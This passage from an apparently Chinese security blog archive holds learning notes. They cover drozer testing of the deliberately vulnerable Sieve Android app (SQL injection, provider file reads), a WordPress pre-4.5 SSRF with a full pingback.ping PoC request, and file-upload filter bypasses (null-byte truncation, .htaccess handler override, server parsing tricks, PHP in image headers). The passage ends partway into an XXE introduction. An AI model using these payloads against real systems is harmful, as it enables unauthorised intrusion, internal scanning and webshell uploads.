启动Activities</h3><p>上图的PWList和FileSelectActivity是exported并且不需要任何权限，我们可以用drozer启动他们，比如感觉PWList这个含金量应该大一点，所以就启动它了，命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.start –component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure></p><h3 id="2-6-从Content-Provider中获取信息"><a href="#2-6-从Content-Provider中获取信息" class="headerlink" title="2.6 从Content Provider中获取信息"></a>2.6 从Content Provider中获取信息</h3><p>接上2.3节，进一步获取<code>content provider</code>的<code>attact surface</code>的信息的命令是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag5.png" alt><br>从上图可以看到2.3节中两个exported的<code>content provider</code>的具体信息，包括名字，权限，访问路径等。</p><h5 id="2-6-1-查找可以访问Content-Provider的URI（数据泄漏）"><a href="#2-6-1-查找可以访问Content-Provider的URI（数据泄漏）" class="headerlink" title="2.6.1 查找可以访问Content Provider的URI（数据泄漏）"></a>2.6.1 查找可以访问Content Provider的URI（数据泄漏）</h5><p>从上节图中我们猜测DBContentProvider会有某种格式的数据库，但是我们不知道其中的数据是如何组织的。Content URI必须是 “content:///” 的形式,因此我们可以构造部分的content URIs来访问DBcontent Provider。 上图存在一个需要READ_KEYS和WRITE_KEYS权限才能读和写的“/Keys”的路径。<br>drozer的scanner模块提供了一些方法去猜测可能存在的content URIs：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.finduris -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag6.png" alt><br>上图中检测出了可以访问content的URI，接下来我们可以用drozer的其他模块和URI从content中获取，甚至更改信息。 如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –vertical</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag7.png" alt><br>如上图我们获取了用户名，邮箱帐号，和Base64编码的密码字符串。</p><h5 id="2-6-2-进行SQL注入"><a href="#2-6-2-进行SQL注入" class="headerlink" title="2.6.2 进行SQL注入"></a>2.6.2 进行SQL注入</h5><p>Android操作系统建议使用SQLite数据库存储用户数据。SQLite数据库使用SQL语句，所以可以进行SQL注入。 使用<code>projection</code>参数和<code>seleciton</code>参数可以传递一些简单的SQL注入语句到Content provider。如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “‘”</span><br><span class="line"></span><br><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –selection “‘”</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.0kami.cn/img/drozer/imag8.png" alt><br>上面两条命令执行后Android设备返回了非常详细的错误信息。<br>使用Sql注入列出数据库中的所有数据表：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM SQLITE_MASTER WHERE type=’table’;–“</span><br></pre></td></tr></table></figure></p><p>使用SQL注入列出数据表的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM Key;–“</span><br></pre></td></tr></table></figure></p><p>使用SQL注入列出数据表的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM Key;–“</span><br></pre></td></tr></table></figure></p><h5 id="2-6-3-从File-System-Backed-Content-Providers获取信息"><a href="#2-6-3-从File-System-Backed-Content-Providers获取信息" class="headerlink" title="2.6.3 从File System-Backed Content Providers获取信息"></a>2.6.3 从File System-Backed Content Providers获取信息</h5><p><code>File System-backed Content Provider</code>提供了访问底层文件系统的方法，Android沙盒会阻止App共享文件允许，而File System-backed Content Provider允许App共享文件。 对于sieve来说，我们可以推测出的<code>FileBackupProvider</code>就是一个file system-backed content provider。 我们可以使用drozer的app.provider.read模块查看某个文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts</span><br></pre></td></tr></table></figure></p><p>可以使用<code>app.provider.download</code>下载文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db</span><br></pre></td></tr></table></figure></p><h5 id="2-6-4-检查Content-Provider的脆弱性"><a href="#2-6-4-检查Content-Provider的脆弱性" class="headerlink" title="2.6.4 检查Content Provider的脆弱性"></a>2.6.4 检查Content Provider的脆弱性</h5><p>检查是否有SQL注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.injection -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p>检查是否存在遍历文件的漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scanner.provider.traversal -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p><strong><em>总结体会：我觉得在刚开始获取了软件包的基本信息后，就先用模块scanner里面的工具扫一扫，找到一些漏洞或者利用点后再进行下一步。</em></strong></p><h3 id="2-7-和Services交互"><a href="#2-7-和Services交互" class="headerlink" title="2.7 和Services交互"></a>2.7 和Services交互</h3><p>获取是exported状态的services的命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure></p><p>关于Services的模块：<br>如向某个服务发送信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService –msg 1 5 3</span><br></pre></td></tr></table></figure></p><h3 id="2-8-其他常用模块"><a href="#2-8-其他常用模块" class="headerlink" title="2.8 其他常用模块"></a>2.8 其他常用模块</h3><ul><li>shell.start 在Android设备上开启一个交互式Linux Shell</li><li>tools.file.upload / tools.file.downloa</li><li>tools.setup.busybox / tools.setup.minimalsu 安 装busybox或者minimalsu到Android设备上</li></ul><p>参考链接：<a href="https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/" target="_blank" rel="noopener">https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/</a><br><a href="http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/" target="_blank" rel="noopener">http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/</a></p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mobile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wordpress SSRF &lt;4.5</title>
      <link href="2016/08/19/old-old-wordpress-ssrf-4-4-2/"/>
      <url>2016/08/19/old-old-wordpress-ssrf-4-4-2/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。<br><a id="more"></a></p><h3 id="ip地址的几种表示方式"><a href="#ip地址的几种表示方式" class="headerlink" title="ip地址的几种表示方式"></a>ip地址的几种表示方式</h3><p>ip地址域名有多种表示方式，浏览器都能识别出来。</p><h6 id="常见的ip地址域名表示方法"><a href="#常见的ip地址域名表示方法" class="headerlink" title="常见的ip地址域名表示方法"></a>常见的ip地址域名表示方法</h6><ul><li>点分十进制表示法，例如192.168.1.2</li><li>二进制表示法例如11000000101010000000000100000010，表示192.168.1.2</li></ul><h6 id="非常见ip地址域名表示方法"><a href="#非常见ip地址域名表示方法" class="headerlink" title="非常见ip地址域名表示方法"></a>非常见ip地址域名表示方法</h6><ul><li>整数型：将上述的二进制直接转换成整数3232235778，浏览器通过访问<a href="http://3232235778" target="_blank" rel="noopener">http://3232235778</a> 解析为192.168.1.2，除此之外还可以通过公式<code>192*256^3+168*256^2+1*256+2=3232235778</code>换算</li><li>八进制型：将IP 192.168.1.2换成8进制0300.0250.01.02，在前面加上0表示8进制</li><li>十六进制型：将IP 192.168.1.2换成16进制0xc0.0xA8.1.2，在前面加上0x表示16进制</li><li>混合型：即以上的几种方式的结合，0300.0xA8.1.0x02</li></ul><p>下面就是通过八进制绕过检测。</p><h3 id="代码详情"><a href="#代码详情" class="headerlink" title="代码详情"></a>代码详情</h3><p>漏洞成因处508 <code>wp_http_validate_url</code> 函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">if</span> ( ! $same_host ) &#123;</span><br><span class="line">$host = trim( $parsed_url[<span class="string">'host'</span>], <span class="string">'.'</span> );</span><br><span class="line"><span class="keyword">if</span> ( preg_match( <span class="string">'#^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;$#'</span>, $host ) ) &#123;</span><br><span class="line">$ip = $host;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$ip = gethostbyname( $host );</span><br><span class="line"><span class="keyword">if</span> ( $ip === $host ) <span class="comment">// Error condition for gethostbyname()</span></span><br><span class="line">$ip = <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $ip ) &#123;</span><br><span class="line">$parts = array_map( <span class="string">'intval'</span>, explode( <span class="string">'.'</span>, $ip ) );</span><br><span class="line"><span class="keyword">if</span> ( <span class="number">127</span> === $parts[<span class="number">0</span>] || <span class="number">10</span> === $parts[<span class="number">0</span>] || <span class="number">0</span> === $parts[<span class="number">0</span>]</span><br><span class="line">|| ( <span class="number">172</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">16</span> &lt;= $parts[<span class="number">1</span>] &amp;&amp; <span class="number">31</span> &gt;= $parts[<span class="number">1</span>] )</span><br><span class="line">|| ( <span class="number">192</span> === $parts[<span class="number">0</span>] &amp;&amp; <span class="number">168</span> === $parts[<span class="number">1</span>] )</span><br><span class="line">) &#123;</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure></p><p>这里的代码通过正则表达式<code>^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$</code>判断ip是否合法，如果不合法则通过网络获取ip的值。<br>下面的if判断则是用来防止给的url为内网ip，但是上述的正则表达式可以通过8进制绕过内网限制。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $parsed_url[<span class="string">'port'</span>] ) )</span><br><span class="line"><span class="keyword">return</span> $url;</span><br><span class="line"></span><br><span class="line">$port = $parsed_url[<span class="string">'port'</span>];</span><br><span class="line"><span class="keyword">if</span> ( <span class="number">80</span> === $port || <span class="number">443</span> === $port || <span class="number">8080</span> === $port )</span><br><span class="line"><span class="keyword">return</span> $url;</span><br></pre></td></tr></table></figure></p><p>再接下来可以看到程序又对端口做了限制，只能扫描80,443,8080端口。<br>综上所述，通过8进制绕过ip判断，可以扫描内网的80,443,8080<br>找一下调用的位置,可以找到class-wp-xmlrpc-server.php通过wp_safe_remote_get调用了get函数，get函数使用了wp_http_validate_url，从而造成ssrf</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>利用的方式为通过xmlrpc.php中pingback.ping功能来调用这个函数。<br>POC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /cms/wordpress/wp442/xmlrpc.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 321</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;pingback.ping&lt;/methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;&lt;value&gt;&lt;string&gt;http://012.10.10.111:8080/testvul&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http://localhost/cms/wordpress/wp442/2016/08/19/hello-world/&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;</span><br><span class="line">&lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure></p><p>这里设置10.10.10.111为受害者<br><img src="http://blog.0kami.cn/img/wordpress_ssrf_4_4_2/wordpress-ssrf.png" alt="image"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在测试中发现只能对10.x.x.x的内网ip进行利用，因为正则的原因至多只能有3位数字，一位需要为0来表示8进制，所以利用只有10,并且只能扫描80,443,8080端口。由于利用中不回显，也很难确定是否成功利用。所以这个洞可能危害比较小（太菜了，想不到其他的利用方式，有其他的利用方式记得分享啊！！！）<br>还有一种利用就是开启xmlrpc的wordpress站可以被通过pingback.ping方法来DDOS，这个以前就有人提出来了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://xlab.baidu.com/wordpress/" target="_blank" rel="noopener">http://xlab.baidu.com/wordpress/</a><br><a href="https://virusdefender.net/index.php/archives/733/" target="_blank" rel="noopener">https://virusdefender.net/index.php/archives/733/</a></p>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传学习总结</title>
      <link href="2016/07/04/old-old-file-upload/"/>
      <url>2016/07/04/old-old-file-upload/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>这几天空下来根据<a href="http://www.owasp.org.cn/OWASP_Training/Upload_Attack_Framework.pdf" target="_blank" rel="noopener">上传攻击框架</a>学习总结一下上传攻击。<br><a id="more"></a></p><h3 id="上传检测流程"><a href="#上传检测流程" class="headerlink" title="上传检测流程"></a>上传检测流程</h3><ol><li>客户端javascript检测（检测文件扩展名为主）</li><li>服务端MIME类型检测（检测Content-type内容）</li><li>服务端目录路劲检测（检测跟path相关的内容）</li><li>服务端文件扩展名检测（检测跟文件后缀相关的内容）</li><li>服务端文件内容检测（检测内容是否合法或含有恶意代码）</li></ol><h3 id="客户端javascript检测"><a href="#客户端javascript检测" class="headerlink" title="客户端javascript检测"></a>客户端javascript检测</h3><p>通常此类检测会在js文件中有一个检测的函数，一般对上传的文件后缀名做检测，例如仅允许上传png,jpg,gif等类型的文件，如果检测到的文件后缀名不是在这些名单内，则不向服务器端传输文件内容。<br>这类检测也是最容易绕过的检测，可以使用firebug之类的插件把它禁掉或者通过burp之类的代理工具进行绕过提交。<br>使用burp，上传时提供一个白名单内的后缀，通过burp拦包，并修改后缀后提交</p><h3 id="服务端检测绕过（MIME类型检测）"><a href="#服务端检测绕过（MIME类型检测）" class="headerlink" title="服务端检测绕过（MIME类型检测）"></a>服务端检测绕过（MIME类型检测）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>) &#123; <span class="comment">//检测Content-type</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">$uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>], $uploadfile))   &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面为php后端检测MIME类型的一个例子<br>通过判断<code>$_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;</code>来保证上传的类型为gif类型的文件。<br>绕过这一类型的检测，可以通过burp拦包，将原<code>Content-Type</code>类型该为符合要求的<code>image/gif</code>类型。</p><h3 id="服务端检测绕过（目录路劲检测）"><a href="#服务端检测绕过（目录路劲检测）" class="headerlink" title="服务端检测绕过（目录路劲检测）"></a>服务端检测绕过（目录路劲检测）</h3><p>有一些web应用程序有多个文件夹用来存储图片文件，所以为了标识上传的图片是属于哪个文件夹的，上传文件时会带上文件存储路劲。而此时如果对文件目录路劲检测不够完全，可以通过截断攻击。（如%00,windows下%80-%90）<br>如上传时提供存储路劲为<code>image/20160704/</code>可以通过修改为<code>image/20160704/evil.php%00</code>来达到截断目的。后端程序会将该路劲连接为<code>image/20160704/evil.php%00filename.gif</code>00截断导致最终存储的文件名为evil.php</p><h3 id="服务器端检测绕过（文件扩展名检测）"><a href="#服务器端检测绕过（文件扩展名检测）" class="headerlink" title="服务器端检测绕过（文件扩展名检测）"></a>服务器端检测绕过（文件扩展名检测）</h3><ol><li>黑名单检测<br>黑名单检测通常会有一个文件后缀名黑名单（例如html|htm|php|php2|php3|php4|php5…）<br>但是通常黑名单检测不能包含所有的恶意脚本后缀，防护难度会比较大，推荐使用白名单<br>绕过的方法：</li></ol><ul><li>文件名大小写绕过（例如用Php，Asp等）</li><li>名单列表绕过(用黑名单中未提及的文件后缀来绕过，如asa，cer等不常见的文件后缀)</li><li>0x00截断（asp下可以尝试使用,asp为从后往前扫描扩展名，<code>evil.asp%00.jpg</code>，会被识别为jpg，只要检测方式如这种可以通过这种方式绕过）</li><li>特殊文件名绕过（只适用windows，将文件名改为evil.php.或evil.php (注意这里有一个空格),在windows下，不允许这样的命名，所以会将.和空格自动去掉）</li><li>.htaccess文件攻击（配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测）</li></ul><h5 id="htaccess文件攻击"><a href="#htaccess文件攻击" class="headerlink" title=".htaccess文件攻击"></a>.htaccess文件攻击</h5><p>如果黑名单中未包含.htaccess后缀的可以通过重写解析配置来达到解析的效果<br>针对php，上传自定义.htaccess<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;haha&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></p><p>同目录有个我们上传一个只有文件名并包含字符串”haha”，但是却无任何扩展名的文件<br>里面的内容是 php 一句话木马，通过菜刀连接可以解析php<br>成因：<br>    在 PHP manual 中提到了下面一段话<br>    move_uploaded_file section, there is a warning which states ‘If the destination file already exists, it will be overwritten.’<br>    如果 PHP 安全没配置好<br>    就可以通过 move_uploaded_file 函数把自己写的.htaccess 文件覆盖掉服务器上的<br>    这样就能任意定义解析名单了</p><ul><li>解析漏洞（apache解析漏洞，iis6.0解析漏洞，nginx解析漏洞）</li></ul><h4 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h4><p>apache是从右到左开始判断解析，如果最右的后缀无法解析，则尝试解析后一个后缀</p><h4 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h4><ul><li>成因为iis6.0不解析;后面的，所以提交evil.asp;.html解析为asp类型</li><li>还有一个为IIS6.0的00截断攻击</li><li>IIS6.0双文件上传</li><li>文件夹的名字包含<code>.asp</code>则这个文件夹下的文件都以asp的形式来解析</li></ul><h4 id="iis7-0-7-5解析漏洞"><a href="#iis7-0-7-5解析漏洞" class="headerlink" title="iis7.0/7.5解析漏洞"></a>iis7.0/7.5解析漏洞</h4><p>对于php有一个类似Nginx的解析漏洞<code>evil.jpg/evil.php</code> 解析evil.jpg中的php代码，这个漏洞成因在于php-cgi的漏洞</p><h4 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h4><ul><li>将php文件换成其他可以通过的文件后缀，访问的时候在后面加上/.php，即evil.jpg/.php，evil.jpg会解析为php的格式</li><li>%00截断</li><li>其他方式<br>提交前将filename=”evil.php”该为”evil.php”.jpg”</li></ul><ol start="2"><li>白名单检测</li></ol><ul><li>0x00截断绕过</li><li>解析漏洞绕过（文件名不被重写）</li></ul><h3 id="服务器端检测绕过（文件内容检测）"><a href="#服务器端检测绕过（文件内容检测）" class="headerlink" title="服务器端检测绕过（文件内容检测）"></a>服务器端检测绕过（文件内容检测）</h3><p>图像类的文件内容检测</p><ul><li>文件幻数检测（图片头格式检测）<br>jpg内容头value= FF D8 FF E0 00 10 4A 46 49 46<br>gif内容头value= 47 49 46 38 39 61<br>png内容头value= 89 50 4E 47</li></ul><p>在文件头后加上一句话木马就能绕过</p><ul><li>文件相关信息检测</li></ul><p>图像文件相关信息检测常用的就是php的getimagesize()函数，可以通过修改图片的注释区（data区）插入一句话代码，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">(...some binary data for image...)</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br><span class="line">(... skipping the rest of binary data ...)</span><br></pre></td></tr></table></figure></p><ul><li>文件加载检测</li></ul><p>调用API或函数去进行文件加载测试，常见的是图像渲染测试，二次渲染，可以通过上传恶意文件，再下载下来，diff一下找到不变的位置插入一句话木马，但成功率不高</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h6 id="轻量级检测绕过攻击"><a href="#轻量级检测绕过攻击" class="headerlink" title="轻量级检测绕过攻击"></a>轻量级检测绕过攻击</h6><ol><li>绕过 javascript 对扩展名的检测<br> &lt;用 burp 之类的反向代理工具直接 POST 数据包到服务端，绕过前端检测&gt;</li><li>绕过服务端对 http request 包 MIME 类型检测<br> &lt;用 burp 之类的反向代理工具伪造 POST 数据包到服务端，绕过 MIME 检测&gt;</li></ol><h6 id="路径-扩展名检测绕过攻击"><a href="#路径-扩展名检测绕过攻击" class="headerlink" title="路径/扩展名检测绕过攻击"></a>路径/扩展名检测绕过攻击</h6><ol><li><p>黑名单绕过<br> 文件名大小写绕过<br> 名单列表绕过<br> 特殊文件名绕过<br> 0x00 截断绕过<br> .htaccess 文件攻击<br> 本地包含漏洞<br> Apache 解析漏洞<br> IIS 解析漏洞<br> Nginx 解析漏洞</p></li><li><p>白名单绕过<br> 0x00 截断绕过<br> 本地文件包含漏洞<br> IIS 解析漏洞<br> Nginx 解析漏洞</p></li><li>文件内容检测绕过攻击</li></ol><h6 id="文件加载测试绕过"><a href="#文件加载测试绕过" class="headerlink" title="文件加载测试绕过"></a>文件加载测试绕过</h6><p>&lt;对文件进行代码注入再配合任意解析调用/漏洞&gt;</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML External Entity(XXE)</title>
      <link href="2016/06/28/old-old-xxe/"/>
      <url>2016/06/28/old-old-xxe/</url>
      
        <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>XML的一些基础知识，摘自<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">security.tencent.com</a><br><a id="more"></a><br>XML例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span>  xml声明</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[   文档类型定义</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>   (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>   (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span>   (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>   (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> 文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>This is a Test<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>上述为一个XML的实例<br>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p><h6 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h6><p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><h6 id="引用外部DTD"><a href="#引用外部DTD" class="headerlink" title="引用外部DTD"></a>引用外部DTD</h6><p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>或者<code>&lt;!DOCTYPE 根元素 PUBLIC &quot;public_ID&quot; 